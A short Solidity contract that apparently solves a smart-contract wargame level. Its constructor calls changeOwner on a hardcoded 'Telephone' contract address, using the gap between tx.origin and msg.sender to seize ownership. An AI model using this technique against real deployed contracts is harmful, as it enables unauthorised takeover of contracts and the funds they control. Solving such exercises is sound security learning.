// SPDX-License-Identifier: MIT


pragma solidity ^0.8.7;


interface Telephone {
    function changeOwner(address _owner) external;
}


contract TelephoneHacked {


    constructor() {
        Telephone hacked = Telephone(0xD22c5e4CBd6C19951469Ca531fC07Eb52DA840De);
        hacked.changeOwner(msg.sender);
    }
}